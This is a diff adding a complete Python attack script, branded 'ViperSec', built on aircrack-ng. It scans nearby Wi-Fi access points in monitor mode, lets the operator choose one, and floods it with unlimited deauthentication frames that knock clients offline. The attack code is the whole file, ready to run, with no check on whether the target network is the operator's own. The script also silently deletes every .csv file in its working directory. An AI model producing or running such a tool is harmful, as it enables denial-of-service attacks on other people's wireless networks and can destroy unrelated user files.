@@ -1,0 +1,161 @@
+#!/usr/bin/env python3
+
+import subprocess
+import re
+import csv
+import os
+import time
+import atexit
+import shutil
+
+active_wireless_networks = []
+hacknic = None
+
+def check_tools():
+    """Check if required tools are installed"""
+    required = ['iwconfig', 'airmon-ng', 'airodump-ng', 'aireplay-ng']
+    missing = [tool for tool in required if not shutil.which(tool)]
+    if missing:
+        print(f"Missing required tools: {', '.join(missing)}")
+        print("Install aircrack-ng suite: sudo apt install aircrack-ng wireless-tools")
+        exit(1)
+
+def cleanup_csv():
+    """Remove any leftover CSV files"""
+    for f in os.listdir():
+        if f.endswith('.csv'):
+            os.remove(f)
+
+def cleanup_on_exit():
+    """Cleanup when program exits"""
+    cleanup_csv()
+    if hacknic:
+        subprocess.run(["airmon-ng", "stop", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# Register cleanup to run on any exit
+atexit.register(cleanup_on_exit)
+
+def check_for_essid(essid, lst):
+    """Check if ESSID already exists in the list"""
+    if len(lst) == 0:
+        return True
+    for item in lst:
+        if essid in item["ESSID"]:
+            return False
+    return True
+
+print(r"""
+╔═══════════════════════════════════════════════════════════════════╗
+║                                                                   ║
+║              ██╗   ██╗██╗██████╗ ███████╗██████╗                  ║ 
+║              ██║   ██║██║██╔══██╗██╔════╝██╔══██╗                 ║
+║              ╚██╗ ██╔╝██║██████╔╝█████╗  ██████╔╝                 ║
+║               ╚████╔╝ ██║██╔═══╝ ██╔══╝  ██╔══██╗                 ║
+║                ╚██╔╝  ██║██║     ███████╗██║  ██║                 ║
+║                 ╚═╝   ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝                 ║ 
+║                                                                   ║
+║                    V I P E R S E C                                ║
+║                     vipersec.xyz                                  ║
+║                                                                   ║
+║              Security • Research • Education                      ║
+║                                                                   ║
+╚═══════════════════════════════════════════════════════════════════╝
+""")
+
+
+if not 'SUDO_UID' in os.environ.keys():
+    print("Try running this program with sudo.")
+    exit()
+
+check_tools()
+
+wlan_pattern = re.compile("^wlan[0-9]+")
+
+check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
+
+if len(check_wifi_result) == 0:
+    print("Please connect a WiFi controller and try again.")
+    exit()
+
+print("The following WiFi interfaces are available:")
+for index, item in enumerate(check_wifi_result):
+    print(f"{index} - {item}")
+
+while True:
+    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
+    try:
+        if check_wifi_result[int(wifi_interface_choice)]:
+            break
+    except:
+        print("Please enter a number that corresponds with the choices.")
+
+hacknic = check_wifi_result[int(wifi_interface_choice)]
+
+print("WiFi adapter connected!\nNow let's kill conflicting processes:")
+kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])
+
+print("Putting Wifi adapter into monitored mode:")
+put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+
+# Start airodump-ng to discover access points
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+# Parse CSV and display discovered networks
+try:
+    while True:
+        subprocess.call("clear", shell=True)
+        for file_name in os.listdir():
+                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
+                if ".csv" in file_name:
+                    with open(file_name) as csv_h:
+                        csv_h.seek(0)
+                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
+                        for row in csv_reader:
+                            if row["BSSID"] == "BSSID":
+                                pass
+                            elif row["BSSID"] == "Station MAC":
+                                break
+                            elif check_for_essid(row["ESSID"], active_wireless_networks):
+                                active_wireless_networks.append(row)
+
+        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
+        print("┌─────┬───────────────────┬─────────┬────────────────────────────────┐")
+        print("│ No  │ BSSID             │ Channel │ ESSID                          │")
+        print("├─────┼───────────────────┼─────────┼────────────────────────────────┤")
+        for index, item in enumerate(active_wireless_networks):
+            bssid = item['BSSID']
+            channel = item['channel'].strip()
+            essid = item['ESSID'][:30] if len(item['ESSID']) > 30 else item['ESSID']
+            print(f"│ {index:<3} │ {bssid:<17} │ {channel:^7} │ {essid:<30} │")
+        print("└─────┴───────────────────┴─────────┴────────────────────────────────┘")
+        time.sleep(1)
+
+except KeyboardInterrupt:
+    print("\nReady to make choice.")
+
+while True:
+    choice = input("Please select a choice from above: ")
+    try:
+        if active_wireless_networks[int(choice)]:
+            break
+    except:
+        print("Please try again.")
+
+hackbssid = active_wireless_networks[int(choice)]["BSSID"]
+hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
+
+#Set monitor mode to target channel
+subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+
+#Launch deauthentication attack
+print(f"\n🎯 Target: {hackbssid} | Channel: {hackchannel}")
+print("─" * 50)
+
+try:
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
+except KeyboardInterrupt:
+    pass
+
+print("\nStop monitoring mode")
+print("Thank you! Exiting now")
+                                                                        
